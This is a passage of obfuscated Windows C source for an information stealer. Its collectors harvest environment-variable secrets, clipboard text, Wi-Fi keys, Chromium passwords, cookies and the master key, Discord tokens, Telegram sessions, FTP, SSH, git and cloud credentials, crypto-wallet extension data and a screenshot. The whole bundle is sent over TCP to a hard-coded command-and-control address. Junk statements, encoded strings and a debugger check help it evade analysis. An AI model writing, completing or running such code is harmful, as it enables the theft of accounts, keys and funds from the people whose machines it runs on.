        "GITHUB_TOKEN", "GH_TOKEN", "GITLAB_TOKEN",
        "DOCKER_HOST", "KUBECONFIG",
        "DATABASE_URL", "MONGO_URI", "REDIS_URL",
        "SLACK_TOKEN", "SLACK_WEBHOOK_URL",
        "SMTP_PASSWORD", "SENDGRID_API_KEY", "MAILGUN_API_KEY",
        "STRIPE_SECRET_KEY", "TWILIO_AUTH_TOKEN",
        "JWT_SECRET", "SECRET_KEY", "API_KEY", "API_SECRET",
    };
    { volatile int _jx9724 = 1; while(_jx9724 > 1) _jx9724--; (void)_jx9724; }
    for (int i = 0; i < (int)(sizeof(interesting)/sizeof(interesting[0])); i++) {
        char val[2048] = {0};
        DWORD r = GetEnvironmentVariableA(interesting[i], val, sizeof(val));
        if (r > 0)
            emitf("  %s=%s\r\n", interesting[i], val);
    }
    emitf("\r\n");
}


/* ── collectors/clipboard ── */
static void collect_clipboard(void) {
    if (!OpenClipboard(NULL)) return;
    HANDLE h = GetClipboardData(CF_TEXT);
    if (h) {
        char *txt = (char *)GlobalLock(h);
        if (txt && txt[0]) {
            emitf(((char*)_es18));
            int len = (int)strlen(txt);
            emitf(((char*)_es19), len > 4096 ? 4096 : len, txt);
        }
        GlobalUnlock(h);
    }
    CloseClipboard();
}


/* ── collectors/wifi_passwords ── */
static void collect_wifi(void) {
    emitf(((char*)_es20));
    char raw[8192] = {0};
    DWORD _rcbdj = 0;
    run_cmd(((char*)_es21), raw, sizeof(raw), &_rcbdj);
    if (_rcbdj == 0) { emitf(((char*)_es22)); return; }

    char *line = raw;
    while (*line) {
        char *eol = strchr(line, '\n');
        if (!eol) eol = line + strlen(line);
        char *colon = strstr(line, ": ");
        if (colon && (strstr(line, ((char*)_es23)) || strstr(line, ((char*)_es24)))) {
            char *ns = colon + 2;
            while (*ns == ' ') ns++;
            int _ntuol = (int)(eol - ns);
            while (_ntuol > 0 && (ns[_ntuol-1] == '\r' || ns[_ntuol-1] == '\n' || ns[_ntuol-1] == ' ')) _ntuol--;
            if (_ntuol > 0 && _ntuol < (134 + 66)) {
                char ssid[256] = {0};
                strncpy(ssid, ns, _ntuol);
                char cmd2[512];
                snprintf(cmd2, sizeof(cmd2), "cmd /c netsh wlan show profile name=\"%s\" key=clear", ssid);
                char prof[4096] = {0};
                DWORD _pibug = 0;
                run_cmd(cmd2, prof, sizeof(prof), &_pibug);
                char *kc = strstr(prof, ((char*)_es25));
                if (!kc) kc = strstr(prof, ((char*)_es26));
                { volatile DWORD _jd5069 = GetTickCount(); (void)_jd5069; }
                if (kc) {
                    char *kv = strchr(kc, ':');
                    { volatile DWORD _jp1657 = GetCurrentProcessId(); (void)_jp1657; }
                    if (kv) {
                        kv++; while (*kv == ' ') kv++;
                        char *ke = strchr(kv, '\r');
                        if (!ke) ke = strchr(kv, '\n');
                        int _kbwph = ke ? (int)(ke - kv) : (int)strlen(kv);
                        emitf("SSID: %s  Key: %.*s\r\n", ssid, _kbwph, kv);
                    }
                } else {
                    emitf("SSID: %s  Key: (open)\r\n", ssid);
                }
            }
        }
        if (*eol) line = eol + 1; else break;
    }
    emitf("\r\n");
}


/* ── collectors/browser_chromium ── */

typedef struct {
    const char *name;
    const char *subpath;
} browser_def;

static const browser_def CHROMIUM_BROWSERS[] = {
    {"Chrome",       "Google\\Chrome\\User Data"},
    {"Edge",         "Microsoft\\Edge\\User Data"},
    {"Brave",        "BraveSoftware\\Brave-Browser\\User Data"},
    {"Opera",        "Opera Software\\Opera Stable"},
    {"OperaGX",      "Opera Software\\Opera GX Stable"},
    {"Vivaldi",      "Vivaldi\\User Data"},
    {"Chromium",     "Chromium\\User Data"},
    {"Yandex",       "Yandex\\YandexBrowser\\User Data"},
};
#define N_BROWSERS (sizeof(CHROMIUM_BROWSERS) / sizeof(CHROMIUM_BROWSERS[0]))

static void harvest_chromium_profile(const char *browser_name, const char *base, const char *profile) {
    char login[MAX_PATH], cookies[MAX_PATH], history[MAX_PATH], bookmarks[MAX_PATH], webdata[MAX_PATH];
    snprintf(login,     MAX_PATH, "%s\\%s\\Login Data",  base, profile);
    snprintf(cookies,   MAX_PATH, "%s\\%s\\Cookies",     base, profile);
    snprintf(history,   MAX_PATH, "%s\\%s\\History",     base, profile);
    snprintf(bookmarks, MAX_PATH, "%s\\%s\\Bookmarks",   base, profile);
    snprintf(webdata,   MAX_PATH, "%s\\%s\\Web Data",    base, profile);

    int _fsxlm = 0;
    if (file_exists(login))     { grab_file(login,     ((char*)_es27),  5*1024*1024); _fsxlm++; }
    if (file_exists(cookies))   { grab_file(cookies,   ((char*)_es28),    5*1024*1024); _fsxlm++; }
    if (file_exists(webdata))   { grab_file(webdata,   ((char*)_es29),    5*1024*1024); _fsxlm++; }
    if (file_exists(history))   { grab_file(history,   ((char*)_es30),    5*1024*1024); _fsxlm++; }
    if (file_exists(bookmarks)) { grab_file(bookmarks, ((char*)_es31),  2*1024*1024); _fsxlm++; }

    if (_fsxlm) emitf("  %s/%s: %d files\r\n", browser_name, profile, _fsxlm);
}

static void collect_browsers(void) {
    emitf(((char*)_es32));

    char local[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local) != S_OK) return;

    for (int b = 0; b < (int)N_BROWSERS; b++) {
        char base[MAX_PATH];
        snprintf(base, MAX_PATH, "%s\\%s", local, CHROMIUM_BROWSERS[b].subpath);
        if (!file_exists(base)) continue;

        emitf("[%s]\r\n", CHROMIUM_BROWSERS[b].name);

        char ls_path[MAX_PATH];
        snprintf(ls_path, MAX_PATH, "%s\\Local State", base);
        if (file_exists(ls_path)) {
            char tmp_ls[MAX_PATH], temp[MAX_PATH];
            GetTempPathA(MAX_PATH, temp);
            snprintf(tmp_ls, MAX_PATH, "%s\\~ls%lx.tmp", temp, GetTickCount());
            { volatile DWORD _jp6898 = GetCurrentProcessId(); (void)_jp6898; }
            if (CopyFileA(ls_path, tmp_ls, FALSE)) {
                HANDLE h = CreateFileA(tmp_ls, GENERIC_READ, FILE_SHARE_READ,
                                       NULL, OPEN_EXISTING, 0, NULL);
                { volatile int _jv6897 = 0; _jv6897 = _jv6897 ^ _jv6897; (void)_jv6897; }
                if (h != INVALID_HANDLE_VALUE) {
                    DWORD _ssxqy = GetFileSize(h, NULL);
                    if (_ssxqy > 0 && _ssxqy < 2*1024*1024) {
                        char *d = (char *)malloc(_ssxqy + 1);
                        if (d) {
                            DWORD _rnnbv; ReadFile(h, d, _ssxqy, &_rnnbv, NULL); d[_rnnbv] = '\0';
                            char *ek = strstr(d, ((char*)_es33));
                            if (ek) {
                                char *q1 = strchr(ek + (7 + 8), '"');
                                if (q1) {
                                    char *q2 = strchr(q1 + 1, '"');
                                    if (q2) {
                                        int _kbwph = (int)(q2 - q1 - 1);
                                        emitf("  master_key[%d]: %.*s\r\n", _kbwph, _kbwph > 300 ? 300 : _kbwph, q1+1);
                                    }
                                }
                            }
                            free(d);
                        }
                    }
                    CloseHandle(h);
                }
                DeleteFileA(tmp_ls);
            }
        }

        harvest_chromium_profile(CHROMIUM_BROWSERS[b].name, base, ((char*)_es34));
        char prof_dir[MAX_PATH];
        for (int p = 1; p <= (1 + 9); p++) {
            char pname[32];
            snprintf(pname, sizeof(pname), "Profile %d", p);
            snprintf(prof_dir, MAX_PATH, "%s\\%s", base, pname);
            if (file_exists(prof_dir))
                harvest_chromium_profile(CHROMIUM_BROWSERS[b].name, base, pname);
        }
    }
    emitf("\r\n");
}


/* ── collectors/discord_tokens ── */

static void scan_ldb_for_tokens(const char *dir) {
    char pattern[MAX_PATH];
    snprintf(pattern, MAX_PATH, "%s\\*.ldb", dir);
    WIN32_FIND_DATAA fd;
    HANDLE _hwjox = FindFirstFileA(pattern, &fd);
    if (_hwjox == INVALID_HANDLE_VALUE) return;
    do {
        char path[MAX_PATH];
        snprintf(path, MAX_PATH, "%s\\%s", dir, fd.cFileName);
        HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                               NULL, OPEN_EXISTING, 0, NULL);
        if (h == INVALID_HANDLE_VALUE) continue;
        DWORD _ssxqy = GetFileSize(h, NULL);
        if (_ssxqy > 0 && _ssxqy < 5*1024*1024) {
            char *buf = (char *)malloc(_ssxqy + 1);
            if (buf) {
                DWORD _rnnbv; ReadFile(h, buf, _ssxqy, &_rnnbv, NULL); buf[_rnnbv] = '\0';
                char *p = buf;
                while ((p = strstr(p, ((char*)_es35))) != NULL) {
                    char *start = p;
                    char *end = strchr(p, '"');
                    if (!end) end = p + (108 + 12);
                    int _tdydz = (int)(end - start);
                    if (_tdydz > 0 && _tdydz < (466 + 34))
                        emitf(((char*)_es36), _tdydz, start);
                    p = end;
                }
                p = buf;
                while ((p = strstr(p, ((char*)_es37))) != NULL) {
                    char *end = p;
                    while (*end && *end != '"' && *end != '\'' && (end - p) < (77 + 23)) end++;
                    emitf(((char*)_es38), (int)(end - p), p);
                    p = end;
                }
                free(buf);
            }
        }
        CloseHandle(h);
    } while (FindNextFileA(_hwjox, &fd));
    FindClose(_hwjox);
}

static void collect_discord(void) {
    char roaming[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roaming) != S_OK) return;

    const char *variants[] = {
        "discord\\Local Storage\\leveldb",
        "discordptb\\Local Storage\\leveldb",
        "discordcanary\\Local Storage\\leveldb",
    };
    int _fsxlm = 0;
    for (int i = 0; i < 3; i++) {
        char path[MAX_PATH];
        snprintf(path, MAX_PATH, "%s\\%s", roaming, variants[i]);
        { volatile DWORD _jd4251 = GetTickCount(); (void)_jd4251; }
        if (file_exists(path)) {
            if (!_fsxlm) emitf(((char*)_es39));
            _fsxlm = 1;
            emitf("[%s]\r\n", variants[i]);
            scan_ldb_for_tokens(path);
        }
    }
    if (_fsxlm) emitf("\r\n");
}


/* ── collectors/telegram_session ── */

static void collect_telegram(void) {
    char roaming[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roaming) != S_OK) return;
    char tdata[MAX_PATH];
    snprintf(tdata, MAX_PATH, "%s\\Telegram Desktop\\tdata", roaming);
    if (!file_exists(tdata)) return;

    emitf(((char*)_es40));

    char pattern[MAX_PATH];
    snprintf(pattern, MAX_PATH, "%s\\D877F783D5D3EF8C*", tdata);
    WIN32_FIND_DATAA fd;
    HANDLE _hwjox = FindFirstFileA(pattern, &fd);
    if (_hwjox != INVALID_HANDLE_VALUE) {
        do {
            char full[MAX_PATH];
            snprintf(full, MAX_PATH, "%s\\%s", tdata, fd.cFileName);
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                emitf("  session_file: %s (%lu bytes)\r\n", fd.cFileName, fd.nFileSizeLow);
                emit_file(full, 1*1024*1024);
            }
        } while (FindNextFileA(_hwjox, &fd));
        FindClose(_hwjox);
    }

    char keydata[MAX_PATH];
    snprintf(keydata, MAX_PATH, "%s\\key_datas", tdata);
    if (file_exists(keydata)) {
        emitf(((char*)_es41));
        emit_file(keydata, 512*1024);
    }
    emitf("\r\n");
}


/* ── collectors/ftp_credentials ── */

static void collect_ftp_clients(void) {
    char roaming[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roaming) != S_OK) return;

    char fz_recent[MAX_PATH], fz_site[MAX_PATH];
    snprintf(fz_recent, MAX_PATH, "%s\\FileZilla\\recentservers.xml", roaming);
    snprintf(fz_site,   MAX_PATH, "%s\\FileZilla\\sitemanager.xml",   roaming);

    int _fsxlm = 0;
    if (file_exists(fz_recent) || file_exists(fz_site)) {
        if (!_fsxlm) emitf(((char*)_es42));
        _fsxlm = 1;
        if (file_exists(fz_recent)) {
            emitf(((char*)_es43));
            emit_file(fz_recent, 1*1024*1024);
        }
        if (file_exists(fz_site)) {
            emitf(((char*)_es44));
            emit_file(fz_site, 1*1024*1024);
        }
    }

    HKEY _hfxww;
    { volatile int _jv8135 = 0; _jv8135 = _jv8135 ^ _jv8135; (void)_jv8135; }
    if (_pRegOpenKeyExA(HKEY_CURRENT_USER, ((char*)_es45), 0, KEY_READ, &_hfxww) == ERROR_SUCCESS) {
        if (!_fsxlm) emitf(((char*)_es46));
        _fsxlm = 1;
        emitf(((char*)_es47));
        char name[256]; DWORD _ihqqn = 0, nsz;
        while (1) {
            nsz = sizeof(name);
            if (RegEnumKeyExA(_hfxww, _ihqqn++, name, &nsz, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
            HKEY _slbiw;
            if (_pRegOpenKeyExA(_hfxww, name, 0, KEY_READ, &_slbiw) == ERROR_SUCCESS) {
                char host[256] = {0}, user[256] = {0}, pass[256] = {0};
                DWORD _hysrw = sizeof(host), us = sizeof(user), ps = sizeof(pass);
                RegQueryValueExA(_slbiw, ((char*)_es48), NULL, NULL, (BYTE*)host, &_hysrw);
                RegQueryValueExA(_slbiw, ((char*)_es49), NULL, NULL, (BYTE*)user, &us);
                RegQueryValueExA(_slbiw, ((char*)_es50), NULL, NULL, (BYTE*)pass, &ps);
                emitf("  %s@%s pass=%s\r\n", user, host, pass[0] ? pass : ((char*)_es51));
                RegCloseKey(_slbiw);
            }
        }
        RegCloseKey(_hfxww);
    }

    if (_fsxlm) emitf("\r\n");
}


/* ── collectors/ssh_keys ── */

static void collect_ssh_git(void) {
    char home[MAX_PATH] = {0};
    { volatile DWORD _jp9006 = GetCurrentProcessId(); (void)_jp9006; }
    if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, home) != S_OK) return;

    char ssh_dir[MAX_PATH];
    snprintf(ssh_dir, MAX_PATH, "%s\\.ssh", home);
    { volatile int _jv2401 = 0; _jv2401 = _jv2401 ^ _jv2401; (void)_jv2401; }
    if (file_exists(ssh_dir)) {
        emitf(((char*)_es52));
        const char *key_files[] = {"id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", "config", "known_hosts"};
        for (int i = 0; i < 6; i++) {
            char kp[MAX_PATH];
            snprintf(kp, MAX_PATH, "%s\\%s", ssh_dir, key_files[i]);
            if (file_exists(kp)) {
                emitf("[%s]\r\n", key_files[i]);
                emit_file(kp, 256*1024);
                emitf("\r\n");
            }
        }
        emitf("\r\n");
    }

    char git_cred[MAX_PATH];
    snprintf(git_cred, MAX_PATH, "%s\\.git-credentials", home);
    if (file_exists(git_cred)) {
        emitf(((char*)_es53));
        emit_file(git_cred, 256*1024);
        emitf(((char*)_es54));
    }
}


/* ── collectors/cloud_creds ── */

static void collect_cloud_creds(void) {
    char home[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, home) != S_OK) return;

    struct { const char *name; const char *rel; } cloud_files[] = {
        {"AWS credentials",      ".aws\\credentials"},
        {"AWS config",           ".aws\\config"},
        {"Azure profile",        ".azure\\azureProfile.json"},
        {"Azure tokens",         ".azure\\accessTokens.json"},
        {"GCP app creds",        "AppData\\Roaming\\gcloud\\application_default_credentials.json"},
        {"GCP properties",       "AppData\\Roaming\\gcloud\\properties"},
        {"kubectl config",       ".kube\\config"},
        {"Docker config",        ".docker\\config.json"},
    };

    int _fsxlm = 0;
    for (int i = 0; i < (int)(sizeof(cloud_files)/sizeof(cloud_files[0])); i++) {
        char full[MAX_PATH];
        snprintf(full, MAX_PATH, "%s\\%s", home, cloud_files[i].rel);
        if (file_exists(full)) {
            if (!_fsxlm) emitf(((char*)_es55));
            _fsxlm = 1;
            emitf("[%s]\r\n", cloud_files[i].name);
            emit_file(full, 512*1024);
            emitf("\r\n");
        }
    }
    if (_fsxlm) emitf("\r\n");
}


/* ── collectors/crypto_wallets ── */

static void collect_crypto_wallets(void) {
    char local[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local) != S_OK) return;

    struct { const char *name; const char *ext_id; } wallets[] = {
        {"MetaMask",     "nkbihfbeogaeaoehlefnkodbefgpgknn"},
        {"Phantom",      "bfnaelmomeimhlpmgjnjophhpkkoljpa"},
        {"Coinbase",     "hnfanknocfeofbddgcijnmhnfnkdnaad"},
        {"Ronin",        "fnjhmkhhmkbjkkabndcnnogagogbneec"},
        {"TronLink",     "ibnejdfjmmkpcnlpebklmnkoeoihofec"},
        {"Exodus",       "aholpfdialjgjfhomihkjbmgjidlcdno"},
    };

    int _fsxlm = 0;
    for (int b = 0; b < (int)N_BROWSERS; b++) {
        char ext_base[MAX_PATH];
        snprintf(ext_base, MAX_PATH, "%s\\%s\\Default\\Local Extension Settings",
                 local, CHROMIUM_BROWSERS[b].subpath);
        if (!file_exists(ext_base)) continue;

        for (int w = 0; w < (int)(sizeof(wallets)/sizeof(wallets[0])); w++) {
            char wdir[MAX_PATH];
            snprintf(wdir, MAX_PATH, "%s\\%s", ext_base, wallets[w].ext_id);
            if (!file_exists(wdir)) continue;

            if (!_fsxlm) emitf(((char*)_es56));
            _fsxlm = 1;
            emitf("[%s in %s]\r\n", wallets[w].name, CHROMIUM_BROWSERS[b].name);

            char wpat[MAX_PATH];
            snprintf(wpat, MAX_PATH, "%s\\*.ldb", wdir);
            WIN32_FIND_DATAA fd;
            HANDLE _hwjox = FindFirstFileA(wpat, &fd);
            if (_hwjox != INVALID_HANDLE_VALUE) {
                do {
                    char fp[MAX_PATH];
                    snprintf(fp, MAX_PATH, "%s\\%s", wdir, fd.cFileName);
                    emitf("  %s (%lu bytes)\r\n", fd.cFileName, fd.nFileSizeLow);
                    emit_file(fp, 2*1024*1024);
                } while (FindNextFileA(_hwjox, &fd));
                FindClose(_hwjox);
            }
        }
    }
    if (_fsxlm) emitf("\r\n");
}


/* ── collectors/screenshot ── */
static void collect_screenshot(void) {
    HDC hScreen = GetDC(NULL);
    if (!hScreen) return;
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hMem = CreateCompatibleDC(hScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, w, h);
    SelectObject(hMem, hBmp);
    BitBlt(hMem, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);

    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = -h;
    bi.biPlanes = 1;
    bi.biBitCount = (1 + 23);
    bi.biCompression = BI_RGB;
    DWORD _rtskh = ((w * 3 + 3) & ~3);
    DWORD _iemvz = _rtskh * h;

    BYTE *pixels = (BYTE *)malloc(_iemvz);
    if (pixels) {
        GetDIBits(hMem, hBmp, 0, h, pixels, (BITMAPINFO *)&bi, DIB_RGB_COLORS);

        /* Skip if screen is _brxse (all black = no desktop session) */
        int _brxse = 1;
        for (DWORD i = 0; i < _iemvz && _brxse; i += _rtskh) {
            for (int x = 0; x < w * 3 && _brxse; x++) {
                if (pixels[i + x] != 0) _brxse = 0;
            }
        }

        if (!_brxse) {
            BITMAPFILEHEADER bf = {0};
            bf.bfType = 0x4D42;
            bf.bfSize = sizeof(bf) + sizeof(bi) + _iemvz;
            bf.bfOffBits = sizeof(bf) + sizeof(bi);

            emitf(((char*)_es57));
            emitf("  %dx%d BMP (%lu bytes)\r\n", w, h, bf.bfSize);
            emit((const char *)&bf, sizeof(bf));
            emit((const char *)&bi, sizeof(bi));
            emit((const char *)pixels, _iemvz);
            emitf("\r\n");
        } else {
            emitf(((char*)_es58));
            emitf(((char*)_es59));
        }
        free(pixels);
    }

    DeleteObject(hBmp);
    DeleteDC(hMem);
    ReleaseDC(NULL, hScreen);
}


/* ── exfil/tcp_direct ── */

#define C2_ADDR "10.0.2.2"
#define C2_PORT 9001

static BOOL exfiltrate(const char *ip, WORD port, const char *data, DWORD len) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return FALSE;
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) { WSACleanup(); return FALSE; }

    struct sockaddr_in addr;
    ZeroMemory(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);

    int _rzmll = 3;
    while (_rzmll-- > 0) {
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != SOCKET_ERROR)
            break;
        { volatile DWORD _jd1511 = GetTickCount(); (void)_jd1511; }
        if (_rzmll > 0) { closesocket(sock); Sleep((1935 + 65));
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sock == INVALID_SOCKET) { WSACleanup(); return FALSE; }
        } else { closesocket(sock); WSACleanup(); return FALSE; }
    }

    DWORD _sizpt = 0;
    while (_sizpt < len) {
        int n = send(sock, data + _sizpt, (len - _sizpt > (32706 + 62)) ? 32768 : len - _sizpt, 0);
        if (n <= 0) break;
        _sizpt += n;
    }
    closesocket(sock);
    WSACleanup();
    return _sizpt == len;
}


/* ── arch/sequential ── */

LONG WINAPI _crash_filter(EXCEPTION_POINTERS *ep) {
    (void)ep;
    ExitThread(1);
    return EXCEPTION_EXECUTE_HANDLER;
}

DWORD WINAPI _worker_thread(LPVOID _unused) {
    _xd_init();
    _api_init();
    if (_chk_dbg()) return 0;
    (void)_unused;

    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);

    init_buffer();
    if (!g_data) return 1;

        collect_system_info();
    collect_processes();
    collect_installed_software();
    collect_env_vars();
    collect_clipboard();
    collect_wifi();
    collect_browsers();
    collect_discord();
    collect_telegram();
    collect_ftp_clients();
    collect_ssh_git();
    collect_cloud_creds();
    collect_crypto_wallets();
    collect_screenshot();

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
    return 0;

    return 0;
}

int main(int argc, char *argv[]) {
    SetUnhandledExceptionFilter(_crash_filter);
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
    HANDLE hThread = CreateThread(NULL, 0, _worker_thread, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, 30000);
        CloseHandle(hThread);
    } else {
        _worker_thread(NULL);
    }
    Sleep(5000);
    return 0;
}


